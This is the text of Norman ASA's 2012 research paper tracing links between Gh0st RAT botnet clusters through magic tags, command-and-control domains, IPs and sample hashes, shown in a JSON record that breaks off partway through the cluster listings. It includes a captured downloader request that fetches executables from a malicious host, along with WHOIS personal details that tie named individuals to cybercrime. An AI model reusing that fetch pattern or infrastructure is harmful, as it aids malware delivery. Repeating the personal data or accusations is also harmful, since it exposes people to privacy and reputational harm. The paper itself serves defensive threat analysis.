{
    "id": "bb7e7aa0-739d-4070-94e9-25827af314ba",
    "created_at": "2022-10-25T16:48:24.853182Z",
    "updated_at": "2025-03-27T02:11:24.393537Z",
    "deleted_at": null,
    "sha1_hash": "02e2959da1d4522c2d94ffbc7a1871470b2f7912",
    "title": "The Many Faces Of Gh0St Rat: Plotting The Connections Between Malware Attacks",
    "authors": "Norman",
    "file_creation_date": "2012-08-16T14:00:01Z",
    "file_modification_date": "2012-08-16T14:01:33Z",
    "file_size": 3824549,
    "plain_text": "# The many faces of Gh0st Rat\n\n## Plotting the connections between malware attacks\n\n#### Snorre Fagerland, Principal Security Researcher Norman ASA\n\n\n-----\n\n### Content\n\nIntroduction ............................................................................................................................................. 3\n\nThe variants ............................................................................................................................................. 4\n\nClusters and links ..................................................................................................................................... 6\n\nOverview plot – with Gh0st ..................................................................................................................... 7\n\nOverview plot – without Gh0st ............................................................................................................... 8\n\nExample botnet infrastructure: wk1888.com ....................................................................................... 11\n\nExample botnet infrastructure: pk39.com ............................................................................................ 16\n\nIndividual clusters .................................................................................................................................. 18\n\nConclusions ............................................................................................................................................ 68\n\nReferences ............................................................................................................................................. 69\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  2\n\n\n-----\n\n### Introduction\n\nGh0st Rat is a well-known Chinese remote access trojan which was originally made by\nC.Rufus Security Team several years ago. Just as with other well-featured “off-the-shelf”\ntrojans like Poison Ivy, Hupigon and DarkComet it has been used by all sorts of people – from\nthe script kiddie next door to resourceful targeted attack actors (1)\n\nCybercriminals use off-the-shelf malware not only because it’s easy and cheap. They also use\nit because it’s hard to track. Anybody could use this malware, so the criminal could be\nanybody. However, this changes somewhat when they start modifying the code. The\nmalware now becomes somewhat attributable and can be connected to known cases and\ncriminal groups. This document is the result of examining selected common traits between\nsome 1200+ Gh0st Rat program files (samples) with the help of Maltego, a tool to visualize\ndata connections. The samples were processed by us in a timeframe of approximately six\nmonths, from August 2011 to February 2012.\n\nIn this study we attempt to map out what logical connections do exist between different\nGh0st botnet campaigns. This is important because it gives an indication of the scale of\noperation and sometimes what the aims of the campaigns are, and this can be valuable for\nrisk analysis. Additional data produced by the study may be used for risk mitigation.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  3\n\n\n-----\n\n### The variants\n\nThe Gh0st Rat source code (version 3.6) is freely available on the Internet, something that\nhas made it quite popular and sparked a multitude of modifications. The resulting trojan can\nbe hard to recognize as Gh0stRat, as attackers ditch various parts of the code that they don't\nneed and add other functionality. In addition, the trojan is packaged in different ways –\nstandalone, glued together with other files, included in self extracting archives. It is\nfrequently obfuscated and compressed.\n\nAs a result of all this, antivirus naming is variable, to put it mildly. Most antivirus detections\ntoday are automatically generated, resulting in names thought out by machines. Quick, but\ncontaining information only machines find interesting.\n\nThe most stable indicator of being faced with a Gh0stRat is its network communication. It is\nwell documented and quite distinctive, as it always begins with a “magic word” which in its\ndefault configuration is “Gh0st” – thus Gh0st Rat. Below is a typical packet (content data\nblurred)\n\n**Fig 1 The fields are magic identifier (‘Gh0st’), size of packet, size of uncompressed packet, and lz-compressed data**\n**containing information about the compromised computer.**\n\nThis magic tag is very easy to spot in network traffic, so the bad guys have come up with a\ncountermeasure. They use other magics. I searched our in-house Malware Analyzer G2\n(MAG2) pcaps for network traffic that matched the Gh0st packet format, and this showed\nabout 50 different magics from the last few months. There are many more in existence –\nsome are shown in Table 2, but as we had no traffic data on these, they were not\ninvestigated.\n```\n 7hero, Adobe, B1X6Z, BEiLa, BeiJi, ByShe, FKJP3, FLYNN, FWAPR, FWKJG,\n GWRAT, Gh0st, GOLDt, HEART, HTTPS, HXWAN, Heart, IM007, ITore, KOBBX,\n KrisR, LUCKK, LURK0, LYRAT, Level, Lover, Lyyyy, MYFYB, MoZhe, MyRat,\n OXXMM, PCRat, QWPOT, Spidern, Tyjhu, URATU, W0LFKO, Wangz, Winds, World,\n X6RAT, XDAPR, Xjjhj, ag0ft, attac, cb1st, https, whmhl, xhjyk\n\n```\nTable 1. Gh0st magic tags used in this paper\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  4\n\n\n-----\n\n```\n 00000, ABCDE, apach, Assas, Blues, chevr, CHINA, cyl22, DrAgOn EXXMM,\n Eyes1, Gi0st, GM110, Hello, httpx, kaGni, light, LkxCq, lvxYT, Naver,\n NIGHT, NoNul, Origi, QQ_124971919, Snown, SocKt, Super, Sw@rd, v2010,\n VGTLS, wcker, Wh0vt, wings, X6M9K, xqwf7, YANGZ\n\n```\n\nTable 2. Known Gh0st magics not investigated in this paper.\n\nThe length of the magic is by default 5 bytes, but this is not the case for all variants. In Table\n1 there are magics with non-standard length – “Spidern” and “W0LFKO” – and we have seen\nothers that were not included in this investigation, like “DrAgOn” and “QQ_124971919”.\n\nThe Spidern variant is non-standard in another way as well. It does not compress its network\ntraffic, something most other Gh0st do. However, when looking at the code in the\ndisassembler IDA Pro, the code relationship is clearly visible.\n\n**Fig 2 Spidern vs Gh0st comparison**\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  5\n\n\n-----\n\n### Clusters and links\n\nClusters are composed of samples that share common traits. Usually this will be common\nmagic tag, but this is not always the case. Sometimes clusters can form around other\nparameters, such as common command & control (C&C) infrastructure. Logical links\nbetween clusters occur when samples, infrastructure components or other factors exhibit\ntraits that belong in more than one cluster. For example, a sample with a magic of “cb1st”\nobviously belongs in the cb1st cluster, but if the C&C server it connects to also accepts\nconnections from samples using the magic “whmhl”, then there is a logical link between the\n_cb1st and whmhl clusters. The strength of such links varies, as there always are possible_\nsources of error which are difficult to map out fully. Such uncertainties can be to what extent\n_is a malware variation shared or sold, or to what extent is command & control infrastructure_\n_hired out or shared._\n\nBecause of these uncertainties, we will only point out where links do exist, without offering\nhard conclusions.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  6\n\n\n-----\n\n### Overview plot – with Gh0st\n\n**Fig 3 Overview with the Gh0st cluster**\n\nThis mosquito swarm consists of trojan files, interconnected primarily by their magic tag, but\nalso by whatever other factor shared with other samples – which C&C server they dial back\nto, and sometimes which IP address this resolves to. The large kludge in the middle is the\ndefault Gh0st group totaling 522 nodes.\n\nA better overview is perhaps gained by removing the “Gh0st” cluster from the graph, as it is\nthe default configuration and not usable for connecting clusters. Doing so results in a smaller\nset of more distinct clusters, where the connections are more visible.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  7\n\n\n-----\n\n### Overview plot – without Gh0st\n\n**Fig 4 Overview without the Gh0st cluster**\n\nThe clusters that link together form clusters of clusters. Stealing unashamedly from\nastronomy, let’s call these superclusters. How such superclusters are linked together is\ndetailed in the chapters that cover individual clusters later in this paper.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  8\n\n\n-----\n\n#### Supercluster one\n\nThis collection of linked clusters contain some of the most populous in the whole set. They\nare linked through the usage of the same C&C servers, through the same malware, and\nthrough the same observed network traffic. The links running through the PCRat cluster are\ndotted red as they are presumably weaker than the others.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  9\n\n\n-----\n\n#### Supercluster two\n\nSupercluster two contains some small and medium size nodes, and indeed one cluster,\nIM007, that has no registered samples in this sample set. Some samples from these clusters\nhave exhibited behavior indicating that they have been used in connection with game\naccount theft.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  10\n\n\n-----\n\n### Example botnet infrastructure: wk1888.com\n\nA large amount of samples connected to www.wk1888.com. This host accepted connections\nfrom at least two botnet clusters – Gh0st on port 8000, and cb1st on port 8181. We have\nalso seen Gh0st samples attempting to connect on port 8080 without being able to establish\ncommunication.\n\nThis multi-botnet support appears usually to be related to timing. Based on the header\ntimestamp of the trojan files, the port 8181 cb1st samples were predominantly created MayJune 2011, while the port 8000 Gh0st samples were created Sept-Oct 2011.\n\nCompile timeline for binaries connecting to\nwk1888.com\n\n\n25.09.2011\nGh0st (5x)\n\n\n29.09.2011\nGh0st (10x)\n\n\n01.06.2011 01.07.2011 01.08.2011 01.09.2011 01.10.2011 01.11.2011\n\n01.05.2011 01.12.2011\n\nWK1888.COM has resolved to many IP addresses over time, all belonging to Krypt\nTechnologies [AS 35908], a US-based VPS hosting service. At the time of writing the IP is\n174.139.51.150. The same WHOIS info points to the domains af0575.com and fz0575.com,\nboth associated with earlier Gh0st Rat samples, and to the domains wt1888.com and\n81266966.com.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  11\n\n\n-----\n\nThe wk1888.com host ran at one point a webserver on port 2011 where it hosted download\ninformation and more executables to download. A sample which used this functionality was\na downloader executable (md5 b6e900f8a14740aa6ad3e755dc2d14bb), which performed\nthe transaction below:\n\nGET /1.txt?abc=78823 HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET4.0C; .NET4.0E)\nHost: www.wk1888.com:2011\nConnection: Keep-Alive\n\nHTTP/1.1 200 OK\nContent-Length: 69\nContent-Type: text/plain\nLast-Modified: Tue, 15 Nov 2011 12:02:04 GMT\nAccept-Ranges: bytes\nETag: \"d446d6638ea3cc1:276\"\nServer: Microsoft-IIS/6.0\nX-Powered-By: ASP.NET\nDate: Wed, 16 Nov 2011 01:26:05 GMT\nhxxp://www.wk1888.com:2011/1.exe\nhxxp://www.wk1888.com:2011/xf80.exe\n\nThe 1.exe file (md5 00118d190f8a30e6dc70b394e603d155) is a Gh0st trojan of the cb1st\ncluster, connecting back to wk1888.com on port 8181. The xf80.exe file is a DarkShell DDOS\ntrojan (md5 d47e37178c0d5b8780b97ce4e7c0e06b).\n\n[Similar functionality was seen on wt1888.com (e.g. 68fdd8adf91308cf35a2e86b15ce6cdd)](http://support.clean-mx.de/clean-mx/viruses.php?domain=wt1888.com)\n(2), and on 81266966.com. The latter hosted downloader and DDOS trojans that connected\nback to wk1888.com (3)\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  12\n\n\nGET /1.txt?abc=78823 HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET4.0C; .NET4.0E)\nHost: www.wk1888.com:2011\nConnection: Keep-Alive\n\nHTTP/1.1 200 OK\nContent-Length: 69\nContent-Type: text/plain\nLast-Modified: Tue, 15 Nov 2011 12:02:04 GMT\nAccept-Ranges: bytes\nETag: \"d446d6638ea3cc1:276\"\nServer: Microsoft-IIS/6.0\nX-Powered-By: ASP.NET\nDate: Wed, 16 Nov 2011 01:26:05 GMT\nhxxp://www.wk1888.com:2011/1.exe\nhxxp://www.wk1888.com:2011/xf80.exe\n\n\n-----\n\n#### Attribution wk1888.com\n\nThe WHOIS information for wk1888.com is as follows:\n```\nWK1888.COM\nAdministrative Contact:\n   meng, meng 1377887494@qq.com\n   east china jiaotong university\n   nanchang, jiangxi 330013\n   China\n\n```\nThe same registration information is used for the domains 81266966.COM, WT1888.COM,\nFZ0575.COM and AF0575.COM.\n\nGoogling the email address “1377887494@qq.com” shows that it is also used to register the\ndomain “boyul.com”, but with different address/phone information.\n```\nBOYUL.COM\nAdministrative Contact:\n   wenyan zhong 1377887494@qq.com\n   telephone: +86.051052478530\n   fax   : +86.051052478531\n   jiangsu wuxi hehuali wuxi jiangsu 214000\n   CN\n\n```\nBoyul.com resolves at the time of writing to the IP 174.139.63.18, which also belongs to\nKrypt Technologies and has historically even been resolved to by wk1888.com.\n\nThe data (phone/address) used to register boyul.com match literally thousands of other\ndomain registrations: HON168.COM, 1585GB.COM, ZJHD518.COM, 17173CGW.COM etc.\n\nThe QQ address 1377887494 is used in several advertisements on the hacking forum\nmy3800.com (Central China Honker Security):\n\n出售免杀GH0ST\n每天赠送50只肉鸡娱乐超低价200元一个月另出租小型肉鸡包天包月位置联系\nQQ:1377887494\n\nTranslation:\n_“Selling undetected GH0ST kits. A package of 50 zombie machines (chicken) comes included,_\n_for 200 yuan (ca 35 USD) a month. Rent zombie machines pr day or pr month, contact me”._\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  13\n\n\n-----\n\nThe QQ number is also found on the forum beishan.info (4), where the poster complains\nabout problems with the registration of the domain www.sock8.com, which he claims he has\nbought from a registered seller on taobao.com. Taobao is the Chinese version of eBay.\n\nThis post was made May 27[th] 2011. The WHOIS info for the sock8.com domain shows that\nMay 19[th] it was apparently reclaimed by Netfirms and returned to a parking IP. Before this,\nthe domain was registered by one “bingxian feng”:\n```\nAdministrative Info:\n  bingxian feng\n  bingxian feng\n  na\n  jiangmen, NA 529700\n  China\n  Phone: +1.102251166\n  Fax..:\n  Email: a916196832@yahoo.com\n  Last modified: 2011-04-11 11:47:43 GMT\n\n```\nIn the period from the domain was registered by Bingxian Feng April 11[th] to its apparent\nseizure in May a number of Ghost trojans surfaced which connected to the sock8 domain.\nThese had an apparent compile date April 12[th] and 13[th].\n\nGoogling for Feng’s email address in the WHOIS shows that it is used for registering literally\nhundreds of domains. Not only that, but it turns out that this player is well known\n[domestically in China (5), where this person allegedly has been involved in pornography,](http://www.nanchang.cyberpolice.cn/show_news.asp?ID=1160)\nmobile phone scams, game theft, and phishing attacks against among others People’s bank\n_of China._\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  14\n\n\n-----\n\n_There are several cyberpolice departments (also known as “Net Cop”) in China, organized by_\n_regions._\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  15\n\n\n-----\n\n### Example botnet infrastructure: pk39.com\n\nThis domain is the second of the two main hubs controlling the cb1st cluster. As previously\nmentioned ddos.pk39.com also operates C&C for the whmhl cluster, and the host\ndown.pk39.com has acted as download server for other malware, typically DDOS trojans of\nvarious kinds.\n\nThe Gh0st trojans dialing home to www.pk39.com were with few exceptions created Jan 13[th]\n2011.\n\nCompile timeline for binaries connecting to\npk39.com\n\n20.02.2011\ncb1st (1x)\n\n13.01.2011 21.08.2011\ncb1st (16x) cb1st (1x)\n\n01.02.2011 01.03.2011 01.04.2011 01.05.2011 01.06.2011 01.07.2011 01.08.2011\n\n01.01.2011 01.09.2011\n\n#### Attribution pk39.com\n\nIts WHOIS information is as follows:\n```\nPK39.COM\nAdministrative Contact:\n Name      : zheng xuming\n Organization  : zheng xuming\n Address    : leqing huayuan lukou\n City      : xianggangtebiexingzhengqu\n Province/State : xianggangtebiexingzhengqu\n Country    : xianggangtebiexingzhengqu\n Email     : 924539333@qq.com\n\n```\nThe email 924539333@qq.com shows up a number of places through Google. One\ninteresting reference is found on the site www.kissqc.com, which just says:\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  16\n\n\n-----\n\nThis is not the only defacement attributable to CǒCǒ – his name is found several places in\nsimilar fashion. He also appears to use another handle frequently associated with hacking.\n\nThese handles appear to match the online profile of a male in his mid-twenties, living in\nChangzhou in the Jiangsu province of China. He appears to be involved in many other\nprojects, from Android development to network security tools. The word “Ghost” is ironically\nused in a lot of his projects.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  17\n\n\n-----\n\n### Individual clusters\n\nWhat follows is a listing and description of the individual botnet clusters. This is fairly\nlengthy, so feel free to skip to Conclusion towards the end of the document.\n\nSome explanation to the individual cluster graphs to come:\n\nBrown nodes are samples\nBlue nodes are malware families (i.e. usually Gh0st variants)\nYellow nodes are C&C servers (hardcoded IP or DNS name)\nPurple nodes are resolved IP addresses\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  18\n\n\n-----\n\n#### Cluster: 7hero\n\nThe 7hero cluster has two samples in the set. It is linked with the PCRat cluster through the\nshared IP address 61.147.123.11 between the PCRat server at 429861812.3322.org and the\n7hero C&C server at z429861812.3322.org. This could have been a coincidence - however,\nthey both also connected at port 4928, something that only these two samples in the whole\ntest set did.\n\nz429861812.3322.org is also used as C&C for samples in the Gh0st cluster.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  19\n\n\n-----\n\n#### Cluster: Adobe\n\nThe Adobe cluster contains one sample, and appears not linked with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  20\n\n\n-----\n\n#### Cluster: ag0ft\n\nThe ag0ft cluster contains one sample, and appears not linked with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  21\n\n\n-----\n\n#### Cluster: attac\n\nThe attac cluster contains one sample, and is linked with the Xjjhj cluster through shared\nC&C at junfang21.3322.org. This C&C server has also served as C&C for Netbot Attacker\nDDOS bots.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  22\n\n\n-----\n\n#### Cluster: B1X6Z\n\nThe B1X6Z cluster contains one sample, and appears not linked with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  23\n\n\n-----\n\n#### Cluster: BeiJi\n\nThe BeiJi cluster contains five samples. Two of these samples connect to\nhong546049008.3322.org, a server which is shared with the IM007 cluster.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  24\n\n\n-----\n\n#### Cluster: BEiLa\n\nThis cluster contains 5 samples and is linked with the IM007 cluster through observed traffic\nfrom the C&C server aa6688519.3322.org.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  25\n\n\n-----\n\n#### Cluster: ByShe\n\nThe ByShe cluster is interesting, as it has been documented used in targeted attacks against\n[Tibetan groups (6) and also connected with the Nitro attacks (7). Five samples exist in this](http://labs.alienvault.com/labs/index.php/2012/targeted-attacks-against-tibet-organizations/)\ncluster, though no other clusters links with it.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  26\n\n\n-----\n\n#### Cluster: cb1st\n\nThe cb1st cluster is one of the larger, with 154 samples. The major C&C’s here are\nwww.wk1888.com and www.pk39.com. The wk1888.com host also acts as C&C for many\nsamples in the Gh0st cluster. cb1st is linked with the KrisR, XDAPR and FKJP3 clusters\nthrough the C&C at daduji.3322.org. The www.pk39.com host links cb1st with the whmhl\ncluster through observed traffic (see whmhl).\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  27\n\n\n-----\n\n#### Cluster: FKJP3\n\nThere is only one sample in this cluster. Through its C&C at daduji.3322.org it links to KrisR,\nXDAPR and cb1st clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  28\n\n\n-----\n\n#### Cluster: FLYNN\n\nThe FLYNN cluster consists of 6 samples. It is linked with the KrisR cluster because of\ncommon C&C at 118.126.16.86 and observed traffic returning FLYNN to a KrisR sample.\n```\n MD5               Host         IP      Port Outgoing Incoming\n 919a4d03cc9dde709b0f2b05a082b179 haidishijie.3322.org 118.126.16.86 8888 KrisR  Gh0st\n 5217f4148fcfabee2791611cfce27997 sr887.3322.org    118.126.16.86 6666 FLYNN  FLYNN\n a28d90a77ae2d8977c31329b1e396f2f sr887.3322.org    118.126.16.86 6666 FLYNN  FLYNN\n 3db213a3f5df462c8bb6cf896af63d28 haidishijie.3322.org 118.126.16.86 6666 KrisR  FLYNN\n 500f7f5f27ee2e4652204313dc2fcb91 haidishijie.3322.org 118.126.16.86 8888 KrisR  Gh0st\n\n```\n© N o r m a n A S A 2 0 1 2 P a g e  |  29\n\n```\n MD5               Host         IP      Port Outgoing Incoming\n 919a4d03cc9dde709b0f2b05a082b179 haidishijie.3322.org 118.126.16.86 8888 KrisR  Gh0st\n 5217f4148fcfabee2791611cfce27997 sr887.3322.org    118.126.16.86 6666 FLYNN  FLYNN\n a28d90a77ae2d8977c31329b1e396f2f sr887.3322.org    118.126.16.86 6666 FLYNN  FLYNN\n 3db213a3f5df462c8bb6cf896af63d28 haidishijie.3322.org 118.126.16.86 6666 KrisR  FLYNN\n 500f7f5f27ee2e4652204313dc2fcb91 haidishijie.3322.org 118.126.16.86 8888 KrisR  Gh0st\n\n```\n\n-----\n\n#### Cluster: FWAPR\n\nThe FWAPR cluster contains one sample, and appears not linked with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  30\n\n\n-----\n\n#### Cluster: FWKJG\n\nThe FWKJG cluster contains one sample, and appears not linked with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  31\n\n\n-----\n\n#### Cluster: Gh0st\n\nThe Gh0st cluster is by far the largest with 522 samples in the test set. Since this is the\ndefault configuration, not much relational information can be inferred from it, even if it\nshares links with many of the other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  32\n\n\n-----\n\n#### Cluster: GOLDt\n\nThe GOLDt cluster contains one sample, and appears not linked with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  33\n\n\n-----\n\n#### Cluster: GWRAT\n\nThe GWRAT cluster contains one sample, and is linked to the MoZhe cluster through\nreturned traffic from its C&C server oa9188.3322.org.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  34\n\n\n-----\n\n#### Cluster: HEART\n\nThere are 7 samples in the HEART cluster. HEART links with KOBBX through common C&C at\ngyxa.3322.org. It also links with the PCRat cluster through a common IP at 60.190.219.234.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  35\n\n\n-----\n\n#### Cluster: Heart\n\nThe Heart cluster consists of 26 samples, and is connected with the main Gh0st cluster\nthrough the C&C at wangyanlei.3322.org. Some of these samples (the ones connecting to\nin1987.3322.org and saaip.3322.org) use uncompressed communication, which is unusual\nfor Gh0st Rat.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  36\n\n\n-----\n\n#### Cluster: HTTPS\n\nThere are two samples in this cluster, but we see no further links with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  37\n\n\n-----\n\n#### Cluster: https\n\nThe https cluster contains one sample, and appears not linked with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  38\n\n\n-----\n\n#### Cluster: HXWAN\n\nThe HXWAN cluster consists of 14 samples. It is linked with the KrisR, Lyyyy and XDAPR\nclusters (See KrisR).\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  39\n\n\n-----\n\n#### Cluster: IM007\n\nThe IM007 cluster surprisingly contains no samples. The reason it exists at all is that we have\nlogged several C&C servers replying with this magic tag, so it is a reasonable assumption that\nthere must exist samples that follow this protocol. The servers we have seen with this\nbehavior have been used by the BeiJi, BEiLa and Wangz clusters, thus linking these.\nIn at least two cases we have seen samples from these clusters showing images of Dungeon\n_Fighter Online virtual items when run, apparently as a lure for game account theft._\n\n_Bamboo Bracelet, an expensive ingame item in DFO._\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  40\n\n\n-----\n\n#### Cluster: ITore\n\nThe ITore cluster appears unconnected to other clusters. The executables are significantly\ndifferent from other Gh0st Rats and may be another family altogether, even if the\ncommunication is similar.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  41\n\n\n-----\n\n#### Cluster: KOBBX\n\nThe KOBBX cluster consists of 13 samples in the set. It is linked with the HEART cluster\nthrough the common C&C at gyxa.3322.org, and to the LUCKK cluster through\nmiscommunication from wjdl.3322.org.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  42\n\n\n-----\n\n#### Cluster: KrisR\n\nThe KrisR cluster consists of 205 samples. The magic tag is actually “KrisRat”, but the tag is\ntruncated in traffic to the regular first 5 bytes.\n\nBy far most samples connect back to haidishijie.3322.org, but many other C&C’s are in use.\nThis cluster links with:\nFLYNN: see FLYNN\nGh0st: f. ex. haidishijie.3322.org returned ‘Gh0st’ in all cases when receiving ‘KrisR’ on port\n8888\nHXWAN: common C&C at ssky.8866.org\nLyyyy: common C&C at ssky.8866.org\nXDAPR: common C&C at ssky.8866.org\ncb1st: common C&C at daduji.3322.org\nFKJP3: common C&C at daduji.3322.org\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  43\n\n\n-----\n\n#### Cluster: Level\n\nThe Level cluster consists of two samples. It appears unlinked with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  44\n\n\n-----\n\n#### Cluster: Lover\n\nThe Lover cluster consists of two samples. It appears unlinked with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  45\n\n\n-----\n\n#### Cluster: LUCKK\n\nThe LUCKK cluster consists of four samples in the set. It is linked with the KOBBX cluster\nthough communication (see KOBBX).\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  46\n\n\n-----\n\n#### Cluster: LURK0\n\nThe LURK0 cluster consists of four samples in the set. This cluster was documented as\nconnected with the SK Communications breach in South Korea in 2011 (8), and has been\nseen used against Tibetan groups (9), (10).\n\nIt is also linked with the OXXMM cluster through the usage of a common C&C at the\nhardcoded IP 218.28.72.138.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  47\n\n\n-----\n\n#### Cluster: LYRAT\n\nThe LYRAT cluster consists of four samples. It appears unconnected with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  48\n\n\n-----\n\n#### Cluster: Lyyyy\n\nThe Lyyyy cluster consists of 4 samples. It is linked with the KrisR, HXWAN and XDAPR\nclusters (See KrisR).\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  49\n\n\n-----\n\n#### Cluster: MoZhe\n\nThis cluster consists of 87 samples. Most of these connect back to b2bweb.3322.org. MoZhe\nis linked with\nX6RAT: common C&C at ingalar.3322.org\nWinds: common C&C at hkl8973875.3322.org\nAdditional links are seen through observed traffic.\nGWRAT: The GWRAT C&C oa9188.3322.org replies with MoZhe (See GWRAT)\nKrisR: The MoZhe C&C at ingalar.3322.org replies with KrisR:\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  50\n\n\n-----\n\n#### Cluster: MYFYB\n\nThe MYFYB cluster contains three samples. It does not appear connected with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  51\n\n\n-----\n\n#### Cluster: MyRat\n\nThe MyRat cluster contains two samples. It appears unconnected with other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  52\n\n\n-----\n\n#### Cluster: OXXMM\n\nThe OXXMM cluster contains eight samples. It connects with the Gh0st main cluster through\ncommon C&C at a6422563.vicp.net and to the LURK0 cluster through common C&C at\n218.28.72.138.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  53\n\n\n-----\n\n#### Cluster: PCRat\n\nThis cluster contains 25 samples, and is linked with the HEART cluster (see HEART), the 7hero\ncluster (see 7hero) as well as the main Gh0st cluster through the common C&C at\ntajs.3322.org. It is also linked to the Winds cluster through common C&C at mstsc5.3322.org.\n\nPCRat samples have been documented used against Uyghur groups (11).\n\nIt is debatable how valid the PCRat connections are. There is apparently a commercially\navailable modification of Gh0st rat called PCRat, which we have not yet seen copies of. If\nthat kit uses the PCRat magic tag as there is reason to suspect, this cluster is of little value.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  54\n\n\n-----\n\n#### Cluster: QWPOT\n\nThe QWPOT cluster contains only one sample. It is connected to the Xjjhj and Gh0st clusters\nthrough its C&C at s17178.3322.org.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  55\n\n\n-----\n\n#### Cluster: Spidern\n\nThe Spidern cluster consists of five samples. It appears unconnected to other clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  56\n\n\n-----\n\n#### Cluster: Tyjhu\n\nThe Tyjhu cluster contains seven samples. It is connected to the Winds cluster through\ncommon C&C at troyok.3322.org.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  57\n\n\n-----\n\n#### Cluster: URATU\n\nThe URATU cluster contains three samples. It appears unconnected with other clusters.\nHowever, recently it has been connected with attacks on Nepalese Government websites\n(12).\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  58\n\n\n-----\n\n#### Cluster: W0LFKO\n\nThe W0LFKO cluster consists of one sample. It is linked to the Wangz cluster by the C&C\na1019500182.3322.org which replies “W0LFKO” when connection is attempted.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  59\n\n\n-----\n\n#### Cluster: Wangz\n\nThere are eight samples in the Wangz cluster. Wangz links with W0LFKO (see W0LFKO),\nIM007 (see IM007) clusters, and also with Xjjhi cluster through observed communication\nfrom the Wangz C&C a6603892.gicp.net.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  60\n\n\n-----\n\n#### Cluster: whmhl\n\nThe whmhl cluster consists of 9 samples; actually only 8 are Gh0stRats. The last sample is a\nDarkShell ddos bot. It is included because it links this cluster with another.\n\nThe DarkShell bot connected to ddos.pk39.com on port 5566. This resolved to the same IP as\nwww.pk39.com, the C&C server for the cb1st cluster. The pcap from this connection reveals\nthat ddos.pk39.com replies with “whmhl”. Gotcha.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  61\n\n\n-----\n\n#### Cluster: Winds\n\nThe Winds cluster encompasses 21 samples. It is linked with the Tyjhu cluster (see Tyjhu),\nthe PCRat cluster (see PCRat) and the MoZhe cluster (see MoZhe).\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  62\n\n\n-----\n\n#### Cluster: World\n\nThe World cluster consists of seven samples.\n\nSamples in this cluster all give the impression that they use hardcoded IP addresses for their\nC&C communication. This is because the real C&C ip is not stored in the executable, but\nexists base64 encoded in a text file downloaded from a remote site. Thus these files are\nshown with two C&C connections.\n\nThis cluster does not seem linked with other clusters. However, there is a strong\nresemblance between these samples and some samples in the Wangz cluster (e.g.\nc577b5a8d07982a2c6c42a7352c0cef8).\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  63\n\n\n-----\n\n#### Cluster: X6RAT\n\nThe X6RAT cluster consists of one sample. It is linked to the MoZhe cluster (see MoZhe) and\nGh0st.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  64\n\n\n-----\n\n#### Cluster: XDAPR\n\nThe XDAPR cluster contains 28 samples. It is linked with the KrisR, HXWAN, cb1st, FKJP3 and\nLyyyy clusters. (See KrisR).\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  65\n\n\n-----\n\n#### Cluster: xhjyk\n\nThe xhjyk cluster consists of one sample. Its C&C server, wo379733061.3322.org, is used by\nanother sample (MD5 2f463a39c10d507b4295e16b7b4e0033) which also connects to\nwk1888.com, the C&C for 